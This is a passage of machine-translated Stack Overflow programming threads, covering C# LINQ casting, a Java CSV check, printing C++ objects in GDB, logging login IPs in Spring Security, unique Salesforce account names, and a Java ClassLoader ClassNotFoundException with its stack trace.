var option1 = items.Select(item => new MyClass(item)).Select(x => (IMyClass)x).ToList() 
```

两者之间的唯一区别是第一个选项需要每个项目两个函数调用（除非 C# 以某种方式内联 lambda，我不相信是这种情况），而第二个选项只需要一个。

就个人而言，作为风格问题，我会选择第二个。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T17:23:07.393

您使用哪一个是一个偏好问题，我们真的无法为您回答。

但是如果你的直觉是正确的，`Cast`就会为你的循环添加第二层迭代。它非常小，我怀疑它会在性能上产生任何可测量的差异，但是该`Cast`方法返回一个`IEnumerable`基本上可以执行此操作的新对象：

```
foreach (object obj in source) yield return (TResult)obj; 
```

效果主要是调用堆栈上的另一个级别；因为它使用`yield`它只会按需迭代，就像大多数其他`IEnumerable`方法一样。但它必须通过两级迭代器状态而不是一级返回。这对您是否重要是您需要为自己的应用程序衡量的东西。

（另请注意，至少根据参考源，它会进行不安全的强制转换，如果强制转换无效，*可能会*引发异常。这是更喜欢您的选项＃2 的另一个原因。）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T17:28:39.297

您始终可以为您的 Select 提供显式类型参数

```
 var option2 = items.Select<IItem,IMyClass>(item => new MyClass(item)).ToList(); 
```

其中 IItem 是可以将项目转换为的类型或接口。

# java - 对 CSV 的布尔响应

> ID：15163259
> 
> 赞同：-2
> 
> 时间：2013-03-01T17:17:48.093
> 
> 标签：java, split

尝试为 CSV 编写一个方法，如果列表中的任何值是字符串“冲浪很有趣”，则该方法应返回 true，否则返回 false。

```
public boolean Practice.parseCSV(String s){
   string s1 = s.split(String ",") 
   for(int i=0; i < s1.length; i++){
      if(s1[i]== "surfing is fun")
         {return true;}
      else{
         return false;}

} 
```

这是我粗略的想法。我们还没有经历过类似的事情，所以我是从头开始做的。你怎么看？老实说，我对正则表达式一点也不熟悉

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:30:12.583

第一步是分析需求。

```
Return False: a,b,c,d
Return True: a,surfing is fun,
Return False: a,s8fing is fun,b 
```

现在想想你会怎么做。看起来你对上面的操作有一个很好的想法。你

1.  使用 ',' 将传入的字符串拆分为数组或列表。
2.  迭代该列表并检查它是否有您正在寻找的值。

请注意，一旦您发现 true，您可能会退出 for 循环。

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:47:12.057

你真的不应该把你的 CS 作业发布到堆栈溢出。除此之外，我注意到您可能想要检查的代码存在一些问题。

> s.split（字符串“，”）

您需要为该对象分配一个变量名称和类型。

> if("冲浪很有趣" = s[i])

这不是比较，不会返回 true 或 false。

> {parseCSV = 真}

您不能将值分配给尚未定义的对象。我建议你是这样的：

> if (s[i] == "surfing is fun") return true 然后在循环结束时返回 false，因为如果字符串包含“surfing is fun”，它可能已经返回 true 并退出。

# c++ - 使用 GDB 打印 C++ 类对象

> ID：15163261
> 
> 赞同：7
> 
> 时间：2013-03-01T17:18:12.013
> 
> 标签：c++, debugging, gdb

当我们调试 C++ 应用程序时，是否有一些“默认函数”可以在 GDB 上打印字符串等对象？像：toString();

或者我的班级必须实现类似的东西？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T17:28:26.007

您总是可以使用命令打印`std::string`（或其他任何内容） 。`print`然而，与 C++ 模板容器内部的斗争可能并不令人愉快。在最新版本的工具链（GDB + Python + Pretty Printers，通常作为开发包的一部分安装在大多数用户友好的 Linux 发行版上）中，它们会被自动识别和打印（漂亮！）。例如：

```
$ cat test.cpp 
#include <string>
#include <iostream>

int main()
{
    std::string s = "Hello, World!";
    std::cout << s << std::endl;
}

$ g++ -Wall -ggdb -o test ./test.cpp 
$ gdb ./test 

(gdb) break main
Breakpoint 1 at 0x400ae5: file ./test.cpp, line 6.
(gdb) run
Starting program: /tmp/test 

Breakpoint 1, main () at ./test.cpp:6
6       std::string s = "Hello, World!";
Missing separate debuginfos, use: debuginfo-install glibc-2.16-28.fc18.x86_64 libgcc-4.7.2-8.fc18.x86_64 libstdc++-4.7.2-8.fc18.x86_64
(gdb) next
7       std::cout << s << std::endl;
(gdb) p s
$1 = "Hello, World!"
(gdb) 
```

正如@111111 所指出的，请查看[http://sourceware.org/gdb/wiki/STLSupport](http://sourceware.org/gdb/wiki/STLSupport)以获取有关如何自己安装它的说明。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-04T09:42:10.917

您可以在调试会话期间从标准库或您自己的数据类型[调用任何成员函数。](http://sourceware.org/gdb/current/onlinedocs/gdb/Calling.html)这有时是在 gdb 中输出对象状态的最简单方法。因为`std::string`你可以称它为`c_str()`返回的成员`const char*`：

```
(gdb) p str.c_str()
$1 = "Hello, World!" 
```

虽然这仅适用于调试实时进程，但不适用于核心转储调试。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T17:26:36.370

gdb 有一个内置`print`命令，您可以在 gdb 中调用任何变量或表达式来查看其值。您应该查看 gdb 文档以了解详细信息。你可以在这里找到完整的手册，也可以[在这里](http://beej.us/guide/bggdb/)[找到](http://sourceware.org/gdb/current/onlinedocs/gdb/)一个不错的介绍指南

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-10-09T18:31:15.893

**`operator<<`从 GDB定义并调用它**

[C++ 等价于 Java 的 toString？](https://stackoverflow.com/questions/1549930/c-equivalent-of-javas-tostring)在评论中提到，并且`operator<<`是在类上定义字符串方法的最常见方法。

这可能是最明智的方法，因为生成的字符串方法将成为代码库本身的一部分，因此：

*   停止编译（希望！）
*   无需任何 GDB 设置即可轻松使用
*   它可以在需要时从 C++ 本身调用

不幸的是，我还没有找到一种`operator<<`从 GDB 调用的完全理智的方法，真是一团糟：[在 gdb 中调用 operator<<](https://stackoverflow.com/questions/3832964/calling-operator-in-gdb)

这对我的 hello world 测试有效：

```
(gdb) call (void)operator<<(std::cerr, my_class)
MyClass: i = 0(gdb) 
```

最后没有换行符，但我可以忍受。

主文件

```
#include <iostream>

struct MyClass {
    int i;
    MyClass() { i = 0; }
};

std::ostream& operator<<(std::ostream &oss, const MyClass &my_class) {
    return oss << "MyClass: i = " << my_class.i;
}

int main() {
    MyClass my_class;
    std::cout << my_class << std::endl;
} 
```

编译：

```
g++ -ggdb3 -O0 -std=c++11 -Wall -Wextra -pedantic -o main.out main.cpp 
```

在 GDB 8.1.0、Ubuntu 18.04 中测试。

# java - 如何使用 Spring 安全性将 IP 地址从经过身份验证的用户保存到数据库？

> ID：15163263
> 
> 赞同：7
> 
> 时间：2013-03-01T17:18:18.900
> 
> 标签：java, spring, authentication, spring-security, ip

当用户登录我的 Spring 应用程序时，我需要跟踪 IP 地址。

安全.xml：

```
<authentication-manager alias="authenticationManager">
<authentication-provider user-service-ref="userService">
    <password-encoder ref="passwordEncoder">
        <salt-source user-property='username' />
    </password-encoder>
</authentication-provider> 
```

豆：

```
<beans:bean id="passwordEncoder"
    class="org.springframework.security.authentication.encoding.ShaPasswordEncoder">
    <beans:constructor-arg value="512" />
</beans:bean> 
```

我有一个自定义 userService，其方法 loadUserByUsername() 返回自定义 UserDetails。此方法通过 DAO 从数据库中获取 UserDetails。UserDetails 包含与用户相关的内容，例如用户名、密码、权限、电子邮件地址，以及特定于应用程序的变量。我需要在我的 JSP 页面中访问这些变量。

当用户在我的应用程序中成功通过身份验证时，我想将 IP 地址、时间戳和用户 ID 保存到数据库中（通过调用自定义服务中的方法，该方法调用 DAO 方法）。

我不确定该怎么做：我应该实现自定义身份验证提供程序吗？扩展 DaoAuthenticationProvider？还是 AbstractUserDetailsAuthenticationProvider？或者是其他东西？

更一般的问题：

A. 一旦用户提供了正确的凭据，我可以在哪里添加一个方法来调用？

B. 如何获取用户的 IP 地址？（知道tomcat在反向代理中运行在apache后面）。

我试图查看相关的问题/答案，但这让我更加困惑。如果有人可以提供一个非常简单的分步实现，那就太棒了。谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T17:35:56.580

您可以提供一个自定义身份验证成功处理程序，该处理程序将负责将当前用户的 IP 保存在数据库中。请参阅[**form-login**](http://static.springsource.org/spring-security/site/docs/3.2.x/reference/springsecurity-single.html#nsa-form-login)标记**的 authentication-success-handler-ref**属性。扩展现有实现之一（例如 SavedRequestAwareAuthenticationSuccessHandler）并添加您的功能将是个好主意。[](http://static.springsource.org/spring-security/site/docs/3.2.x/reference/springsecurity-single.html#nsa-form-login)

 **只需执行以下操作，您就可以在任何地方进行身份验证后获取 IP：

```
WebAuthenticationDetails details = (WebAuthenticationDetails)SecurityContextHolder.getContext().getAuthentication().getDetails();
String ip = details.getRemoteAddress(); 
```

尝试一下。如果由于反向代理而给您错误的 IP 地址，请考虑将客户端 IP 添加为请求标头。**

# salesforce - 帐户名称必须是唯一的

> ID：15163271
> 
> 赞同：0
> 
> 时间：2013-03-01T17:18:47.667
> 
> 标签：salesforce

我要做的是使它成为“帐户”名称字段需要一个唯一的名称。

基本上，如果我的一位代表尝试创建一个帐户，并且该帐户已准备就绪，则它会告诉他们不存在该帐户已准备就绪。

Salesforce 告诉我这种功能并没有建立在销售队伍中。任何帮助或指导我们都会很棒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T21:18:42.067

创建一个新的文本字段，调用它`Name__c`。将其标记为唯一，长度...可能是 80，与`Name`字段长度相同。

使用条件创建新的[工作流规则](https://help.salesforce.com/htviewhelpdoc?id=customize_wfrules.htm&siteLang=en_US)`ISNEW() || ISCHANGED(Name) || ISBLANK(Name__c)`，操作应该是一个字段更新，它只包含`Name`在确定新值的公式中。

请记住激活工作流程并填写新创建的字段，因为您所有现有帐户的字段都是空白的！

如果您想在页面布局上显示该字段（它非常“技术性”，因此可以隐藏），请致电您。如果你这样做 - 将其设为只读是个好主意！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-29T16:47:00.780

您可以使用此验证：

```
AND(CONTAINS(VLOOKUP( $ObjectType.Account.Fields.Name , $ObjectType.Account.Fields.Name, Name), Name), OR(ISNEW(), ISCHANGED(Name)) ) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-07-10T23:05:12.717

为此，Salesforce 提供了重复管理。

您只需在设置 > 管理设置 > Data.com 管理 > 重复管理中为您的帐户对象设置匹配规则和重复规则。

链接：[https ://help.salesforce.com/apex/HTViewHelpDoc?id=duplicate_prevention_map_of_tasks.htm&language=en_US](https://help.salesforce.com/apex/HTViewHelpDoc?id=duplicate_prevention_map_of_tasks.htm&language=en_US)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T21:11:52.530

您始终可以创建一个自定义字段来包含帐户名称（例如“公司名称”），然后确保它是必需的且唯一的。

您需要做一些基本的 Data Loader 操作以将您的帐户名称移动到新字段，并提出一种策略来填充帐户的现有名称字段。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T18:37:06.050

您可以编写一个触发器来防止重复。这将是一个“插入前”触发器，用于查询具有相同名称的现有帐户。如果帐户名称已经存在，您将调用`addError()`新的帐户记录，从而阻止插入继续。

您是否在 AppExchange 上搜索过解决方案？可能想看看像[DupeCatcher这样的东西](https://appexchange.salesforce.com/listingDetail?listingId=a0N30000003IYLlEAO)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-12-09T16:55:24.703

```
AND(VLOOKUP($ObjectType.Object_Name.Fields.Name, $ObjectType.Object_Name.Fields.Name, Name) = Name, OR(ISNEW(), ISCHANGED(Name))) 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2016-12-01T22:13:36.333

您可能还希望查看 AppExchange 中的 Duplicate Check 应用程序。它提供了一种简单的方法来阻止或警告重复数据的插入或可能导致重复数据的更新。还有许多其他功能，但您在这里需要一个。

[https://appexchange.salesforce.com/listingDetail?listingId=a0N300000058vzKEAQ](https://appexchange.salesforce.com/listingDetail?listingId=a0N300000058vzKEAQ)

# asp.net - Asp.Net MVC 4 与 Visual Studio 2012 的混合？

> ID：15163272
> 
> 赞同：0
> 
> 时间：2013-03-01T17:18:56.223
> 
> 标签：asp.net, asp.net-mvc-4, visual-studio-2012, blend

到目前为止我还没有看到，但你可以使用 Blend 在 asp.net mvc 4 中创建（共享）布局吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-03T20:55:20.480

不幸的是，您可以在 Blend 中执行的唯一 HTML 是用于构建 Windows 应用商店应用程序。尽管 HTML 在您使用的任何上下文中都是 HTML，并且理论上应该可以在 Blend 中设计 HTML 站点，但它并不是为此而构建的。无法使用 ASP.Net。

我承认 Blend 将是设计常规 Web 应用程序的绝佳工具。我个人希望将来会有支持。

# java - 在 FileWalker 中使用 ClassLoader 的 ClassNotFoundException

> ID：15163275
> 
> 赞同：2
> 
> 时间：2013-03-01T17:19:00.547
> 
> 标签：java, classloader, classnotfoundexception

我有一个程序，用户选择一个目录来开始 FileWalk；FileWalker 访问目录结构中加载`.class`文件的每个文件，`CLassLoader`因此我可以使用`Reflection`它们在 GUI 中显示有关该类的信息。

如果用户选择具有此结构的文件夹 FileReader：

```
D:\Users\Ste\Documents\Eclipse Workspace\Project Tests\File Reader
    │
    ├───+bin
    │   │   ReadFile.class   
    |
    │
    └───+src
        │   ReadFile.java 
```

加载`ClassLoader`没有问题`ReadFile.class`

但是，如果我在包 Test 中选择具有添加类的相同目录：

```
D:\Users\Ste\Documents\Eclipse Workspace\Project Tests\File Reader
    │
    ├───+bin
    │   │   ReadFile.class
    │   │
    │   └───+Test
    │           TestClass.class
    │
    └───+src
        │   ReadFile.java
        │
        └───+Test
                TestClass.java 
```

Eclipse 抛出一个`java.lang.ClassNotFoundException: Test.TestClass`.

那么为什么我得到一个`java.lang.ClassNotFoundException`？下面是我的代码，其中一些`System.out.println()`显示了一些值。（目录结构与上面的结构相同）

```
public class ReflectOnClasses extends SimpleFileVisitor<Path> {

    //Starts the file walk from a starting directory
    public static void startFileWalk(String directory){

        //The startingDir is the directory the user selects on the Main UI Part
        Path startingDir = FileSystems.getDefault().getPath(directory, "");
        System.out.println("Staring Directory the user selected: " + startingDir);
        System.out.println("--------------------------------------------------------------------------------------------------------");
        //Create an instance of my FileVisitor
        ReflectOnClasses reflectOnClasses = new ReflectOnClasses();

        try {
            //Walk the files from my startingDir using reflectOnClasses
            Files.walkFileTree(startingDir, reflectOnClasses);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            System.out.println("An Error Occured");
            e.printStackTrace();
        }
    }

    //Visit files and do something with them
    @Override
    public FileVisitResult visitFile(Path filesPath, BasicFileAttributes attr) {

        //If we find a .class file get it and reflect upon it
        if(filesPath.toString().endsWith(".class")){

            //Create a File object of the files directory
            File parentDir = new File(filesPath.getParent().toString());
            System.out.println("Parent Directory: " + filesPath.getParent().toString());

            try{

                //Convert parentDir to URL
                URL url = parentDir.toURL();
                URL[] urls = new URL[]{url};

                //Create a new class loader with the directory
                ClassLoader cl = new URLClassLoader(urls);

                /*
                 * To load a class we need the class name and the package it belongs too in the format
                 * "example.package.name\FooBar". We can easily get the class name by getting the name
                 * of filesPath and removing the .class on the end
                 */
                String className = filesPath.getFileName().toString().replace(".class", "");
                System.out.println("The className: " + className);

                //classesPackage + className
                String classToLoad = getPackageName(filesPath) + className;
                System.out.println("The classToLoad: " + classToLoad);

                //Load in the class
                Class<?> cls = cl.loadClass(classToLoad);

                System.out.println("--------------------------------------------------------");

                //Pass the name of the class to addClassToVariableTree in CreatUI so it can be added as a TreeItem
                CreateMainUI.addClassToVariableTree(classToLoad);
                //Do the same for addClassToMethodTree
                CreateMainUI.addClassToMethodTree(classToLoad);

                //Array of the declared fields in the class
                Field[] fieldsInClass = cls.getDeclaredFields();

                //For each field in fieldsInClass we add it as a TreeItem using addVariableToClassTreeItem
                for( Field field: fieldsInClass){
                    CreateMainUI.addVariableToClassNameTreeItem(field.getGenericType().toString(), field.getName());
                }

                //Array of all methods in the class
                Method[] methodsInClass = cls.getDeclaredMethods();

                //For each method we pass through the string representation of it, the class it belongs too and it's name. It will be formatted in CreateUI
                for (Method method : methodsInClass) {
                    CreateMainUI.addMethodToClassNameTreeItem(method.toString(), classToLoad, method.getName());
                }

            } catch (MalformedURLException e) {
                System.out.println("URL BAD");
            } 
            catch (ClassNotFoundException e){
                System.out.println("Class couldnt be found");
                e.printStackTrace();
            }

        }

        return CONTINUE;

    }

    private String getPackageName(Path filesPath){

        /*
         * To get the package name we will have to construct it manually. If the class
         * was already loaded we could get the package info using built in Java methods, but we
         * haven't loaded the class yet and can't without this package information hence we will
         * build a package name up be traversing back up to the bin folder adding the folder titles
         * to a String Builder as we go
         */
        File currentFolder = filesPath.toFile().getParentFile();

        String classesPackage = "";

        while(true){

            if(!(currentFolder.getName().equals("bin"))){

                classesPackage = currentFolder.getName() + "." + classesPackage;

                currentFolder = currentFolder.getParentFile();
            }
            else{

                break;
            }
        }

        return classesPackage;
    }

} 
```

控制台输出：

```
Staring Directory the user selected: D:\Users\Ste\Documents\Eclipse Workspace\Project Tests\File Reader
----------------------------------------------------
Parent Directory: D:\Users\Ste\Documents\Eclipse Workspace\Project Tests\File Reader\bin
The className: ReadFile
The classToLoad: ReadFile
--------------------------------------------------------
Parent Directory: D:\Users\Ste\Documents\Eclipse Workspace\Project Tests\File Reader\bin\Test
The className: TestClass
The classToLoad: Test.TestClass
Class couldnt be found
java.lang.ClassNotFoundException: Test.TestClass
    at java.net.URLClassLoader$1.run(URLClassLoader.java:366)
    at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
    at ste.wootten.honoursproject.mainpart.reflection.ReflectOnClasses.visitFile(ReflectOnClasses.java:146)
    at ste.wootten.honoursproject.mainpart.reflection.ReflectOnClasses.visitFile(ReflectOnClasses.java:1)
    at java.nio.file.FileTreeWalker.walk(FileTreeWalker.java:135)
    at java.nio.file.FileTreeWalker.walk(FileTreeWalker.java:199)
    at java.nio.file.FileTreeWalker.walk(FileTreeWalker.java:199)
    at java.nio.file.FileTreeWalker.walk(FileTreeWalker.java:199)
    at java.nio.file.FileTreeWalker.walk(FileTreeWalker.java:69)
    at java.nio.file.Files.walkFileTree(Files.java:2591)
    at java.nio.file.Files.walkFileTree(Files.java:2624)
    at ste.wootten.honoursproject.mainpart.reflection.ReflectOnClasses.startFileWalk(ReflectOnClasses.java:41)
    at ste.wootten.honoursproject.mainpart.CreateMainUI.selectDirectoryAndBeginFileWalk(CreateMainUI.java:258)
    at ste.wootten.honoursproject.mainpart.CreateMainUI.createInterface(CreateMainUI.java:159)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.eclipse.e4.core.internal.di.MethodRequestor.execute(MethodRequestor.java:56)
    at org.eclipse.e4.core.internal.di.InjectorImpl.processAnnotated(InjectorImpl.java:859)
    at org.eclipse.e4.core.internal.di.InjectorImpl.inject(InjectorImpl.java:111)
    at org.eclipse.e4.core.internal.di.InjectorImpl.internalMake(InjectorImpl.java:319)
    at org.eclipse.e4.core.internal.di.InjectorImpl.make(InjectorImpl.java:240)
    at org.eclipse.e4.core.contexts.ContextInjectionFactory.make(ContextInjectionFactory.java:161)
    at org.eclipse.e4.ui.internal.workbench.ReflectionContributionFactory.createFromBundle(ReflectionContributionFactory.java:102)
    at org.eclipse.e4.ui.internal.workbench.ReflectionContributionFactory.doCreate(ReflectionContributionFactory.java:71)
    at org.eclipse.e4.ui.internal.workbench.ReflectionContributionFactory.create(ReflectionContributionFactory.java:53)
    at org.eclipse.e4.ui.workbench.renderers.swt.ContributedPartRenderer.createWidget(ContributedPartRenderer.java:141)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.createWidget(PartRenderingEngine.java:896)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:630)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:732)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.access$2(PartRenderingEngine.java:703)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$7.run(PartRenderingEngine.java:697)
    at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:42)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.createGui(PartRenderingEngine.java:682)
    at org.eclipse.e4.ui.workbench.renderers.swt.StackRenderer.showTab(StackRenderer.java:1114)
    at org.eclipse.e4.ui.workbench.renderers.swt.LazyStackRenderer$1.handleEvent(LazyStackRenderer.java:67)
    at org.eclipse.e4.ui.services.internal.events.UIEventHandler$1.run(UIEventHandler.java:41)
    at org.eclipse.swt.widgets.Synchronizer.syncExec(Synchronizer.java:180)
    at org.eclipse.swt.widgets.Display.syncExec(Display.java:4687)
    at org.eclipse.e4.ui.internal.workbench.swt.E4Application$1.syncExec(E4Application.java:187)
    at org.eclipse.e4.ui.services.internal.events.UIEventHandler.handleEvent(UIEventHandler.java:38)
    at org.eclipse.equinox.internal.event.EventHandlerWrapper.handleEvent(EventHandlerWrapper.java:197)
    at org.eclipse.equinox.internal.event.EventHandlerTracker.dispatchEvent(EventHandlerTracker.java:197)
    at org.eclipse.equinox.internal.event.EventHandlerTracker.dispatchEvent(EventHandlerTracker.java:1)
    at org.eclipse.osgi.framework.eventmgr.EventManager.dispatchEvent(EventManager.java:230)
    at org.eclipse.osgi.framework.eventmgr.ListenerQueue.dispatchEventSynchronous(ListenerQueue.java:148)
    at org.eclipse.equinox.internal.event.EventAdminImpl.dispatchEvent(EventAdminImpl.java:135)
    at org.eclipse.equinox.internal.event.EventAdminImpl.sendEvent(EventAdminImpl.java:78)
    at org.eclipse.equinox.internal.event.EventComponent.sendEvent(EventComponent.java:39)
    at org.eclipse.e4.ui.services.internal.events.EventBroker.send(EventBroker.java:81)
    at org.eclipse.e4.ui.internal.workbench.UIEventPublisher.notifyChanged(UIEventPublisher.java:58)
    at org.eclipse.emf.common.notify.impl.BasicNotifierImpl.eNotify(BasicNotifierImpl.java:374)
    at org.eclipse.e4.ui.model.application.ui.impl.ElementContainerImpl.setSelectedElement(ElementContainerImpl.java:171)
    at org.eclipse.e4.ui.workbench.renderers.swt.LazyStackRenderer.postProcess(LazyStackRenderer.java:103)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:646)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:732)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.access$2(PartRenderingEngine.java:703)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$7.run(PartRenderingEngine.java:697)
    at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:42)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.createGui(PartRenderingEngine.java:682)
    at org.eclipse.e4.ui.workbench.renderers.swt.SWTPartRenderer.processContents(SWTPartRenderer.java:59)
    at org.eclipse.e4.ui.workbench.renderers.swt.PerspectiveRenderer.processContents(PerspectiveRenderer.java:59)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:642)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:732)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.access$2(PartRenderingEngine.java:703)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$7.run(PartRenderingEngine.java:697)
    at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:42)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.createGui(PartRenderingEngine.java:682)
    at org.eclipse.e4.ui.workbench.renderers.swt.PerspectiveStackRenderer.showTab(PerspectiveStackRenderer.java:103)
    at org.eclipse.e4.ui.workbench.renderers.swt.LazyStackRenderer$1.handleEvent(LazyStackRenderer.java:67)
    at org.eclipse.e4.ui.services.internal.events.UIEventHandler$1.run(UIEventHandler.java:41)
    at org.eclipse.swt.widgets.Synchronizer.syncExec(Synchronizer.java:180)
    at org.eclipse.swt.widgets.Display.syncExec(Display.java:4687)
    at org.eclipse.e4.ui.internal.workbench.swt.E4Application$1.syncExec(E4Application.java:187)
    at org.eclipse.e4.ui.services.internal.events.UIEventHandler.handleEvent(UIEventHandler.java:38)
    at org.eclipse.equinox.internal.event.EventHandlerWrapper.handleEvent(EventHandlerWrapper.java:197)
    at org.eclipse.equinox.internal.event.EventHandlerTracker.dispatchEvent(EventHandlerTracker.java:197)
    at org.eclipse.equinox.internal.event.EventHandlerTracker.dispatchEvent(EventHandlerTracker.java:1)
    at org.eclipse.osgi.framework.eventmgr.EventManager.dispatchEvent(EventManager.java:230)
    at org.eclipse.osgi.framework.eventmgr.ListenerQueue.dispatchEventSynchronous(ListenerQueue.java:148)
    at org.eclipse.equinox.internal.event.EventAdminImpl.dispatchEvent(EventAdminImpl.java:135)
    at org.eclipse.equinox.internal.event.EventAdminImpl.sendEvent(EventAdminImpl.java:78)
    at org.eclipse.equinox.internal.event.EventComponent.sendEvent(EventComponent.java:39)
    at org.eclipse.e4.ui.services.internal.events.EventBroker.send(EventBroker.java:81)
    at org.eclipse.e4.ui.internal.workbench.UIEventPublisher.notifyChanged(UIEventPublisher.java:58)
    at org.eclipse.emf.common.notify.impl.BasicNotifierImpl.eNotify(BasicNotifierImpl.java:374)
    at org.eclipse.e4.ui.model.application.ui.advanced.impl.PerspectiveStackImpl.setSelectedElement(PerspectiveStackImpl.java:135)
    at org.eclipse.e4.ui.model.application.ui.advanced.impl.PerspectiveStackImpl.setSelectedElement(PerspectiveStackImpl.java:1)
    at org.eclipse.e4.ui.workbench.renderers.swt.LazyStackRenderer.postProcess(LazyStackRenderer.java:103)
    at org.eclipse.e4.ui.workbench.renderers.swt.PerspectiveStackRenderer.postProcess(PerspectiveStackRenderer.java:77)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:646)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:732)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.access$2(PartRenderingEngine.java:703)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$7.run(PartRenderingEngine.java:697)
    at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:42)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.createGui(PartRenderingEngine.java:682)
    at org.eclipse.e4.ui.workbench.renderers.swt.SWTPartRenderer.processContents(SWTPartRenderer.java:59)
    at org.eclipse.e4.ui.workbench.renderers.swt.WBWRenderer.processContents(WBWRenderer.java:639)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:642)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.safeCreateGui(PartRenderingEngine.java:732)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.access$2(PartRenderingEngine.java:703)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$7.run(PartRenderingEngine.java:697)
    at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:42)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.createGui(PartRenderingEngine.java:682)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$9.run(PartRenderingEngine.java:964)
    at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.run(PartRenderingEngine.java:923)
    at org.eclipse.e4.ui.internal.workbench.E4Workbench.createAndRunUI(E4Workbench.java:86)
    at org.eclipse.e4.ui.internal.workbench.swt.E4Application.start(E4Application.java:150)
    at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:353)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:180)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:629)
    at org.eclipse.equinox.launcher.Main.basicRun(Main.java:584)
    at org.eclipse.equinox.launcher.Main.run(Main.java:1438)
    at org.eclipse.equinox.launcher.Main.main(Main.java:1414) 
```

如您所见，它可以`ReadFile.class`很好地找到并加载它，但是当我想加载`Test.TestClass`它时说`ClassNotFoundException`. 有任何想法吗？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-04T10:44:04.357

当你走路`TestFile.class`

```
File parentDir = new File(filesPath.getParent().toString());
System.out.println("Parent Directory: " + filesPath.getParent().toString()); 
```

在这之后，你有`parentDir = "D:\Users\Ste\Documents\Eclipse Workspace\Project Tests\File Reader\bin\Test"`

```
